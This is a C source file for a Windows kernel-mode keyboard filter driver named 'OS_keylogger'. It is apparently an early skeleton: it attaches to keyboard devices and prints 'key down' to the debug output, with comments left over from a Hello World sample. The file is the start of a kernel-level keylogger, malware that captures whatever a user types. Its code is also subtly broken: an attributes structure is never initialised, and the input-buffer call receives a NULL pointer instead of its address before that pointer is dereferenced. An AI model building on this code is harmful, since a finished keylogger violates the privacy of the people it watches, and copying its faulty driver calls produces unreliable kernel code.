#include <ntddk.h>
#include <wdf.h>

#include<ntddkbd.h>

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD OS_keyloggerEvtDeviceAdd;
EVT_WDF_IO_QUEUE_IO_READ OS_keyloggerRead;

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT     DriverObject,
    _In_ PUNICODE_STRING    RegistryPath
)
{
    // NTSTATUS variable to record success or failure
    NTSTATUS status = STATUS_SUCCESS;

    // Allocate the driver configuration object
    WDF_DRIVER_CONFIG config;

    // Print "Hello World" for DriverEntry
    DbgPrint("OS_keylogger: DriverEntry\n");

    // Initialize the driver configuration object to register the
    // entry point for the EvtDeviceAdd callback, KmdfHelloWorldEvtDeviceAdd
    WDF_DRIVER_CONFIG_INIT(&config,
        OS_keyloggerEvtDeviceAdd
    );

    // Finally, create the driver object
    status = WdfDriverCreate(DriverObject,
        RegistryPath,
        WDF_NO_OBJECT_ATTRIBUTES,
        &config,
        WDF_NO_HANDLE
    );
    return status;
}

NTSTATUS
OS_keyloggerEvtDeviceAdd(
    _In_    WDFDRIVER       Driver,
    _Inout_ PWDFDEVICE_INIT DeviceInit
)
{
    // We're not using the driver object,
    // so we need to mark it as unreferenced
    UNREFERENCED_PARAMETER(Driver);

    NTSTATUS status;
    WDF_OBJECT_ATTRIBUTES wdfObjectAttr;
    WDFDEVICE wdfDevice;

    // Print "Hello World"
    DbgPrint("OS_keylogger: OS_keyloggerEvtDeviceAdd\n");

    WdfFdoInitSetFilter(DeviceInit);

    WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);

    // Create the device object
    status = WdfDeviceCreate(&DeviceInit,
        &wdfObjectAttr,
        &wdfDevice
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: WdfDeviceCreate failed\n");
        return status;
    }

    WDF_IO_QUEUE_CONFIG queueConfig;

    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig,
        WdfIoQueueDispatchParallel);

    queueConfig.EvtIoRead = OS_keyloggerRead;

    status = WdfIoQueueCreate(wdfDevice,
        &queueConfig,
        WDF_NO_OBJECT_ATTRIBUTES,
        WDF_NO_HANDLE
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: WdfIoQueueCreate failed\n");
        return status;
    }

    return STATUS_SUCCESS;
}

VOID
OS_keyloggerRead(
    _In_ WDFQUEUE queue,
    _In_ WDFREQUEST request,
    _In_ size_t size
) 
{
    NTSTATUS status;

    UNREFERENCED_PARAMETER(queue);

    PKEYBOARD_INPUT_DATA input = NULL;
    status = WdfRequestRetrieveInputBuffer(request, size, (PVOID*)input, NULL);

    if (!NT_SUCCESS(status)) {
        return;
    }

    if (input->Flags == 0) {
        DbgPrint("OS_keylogger: key down\n");
    }
    WdfRequestComplete(request, STATUS_SUCCESS);
}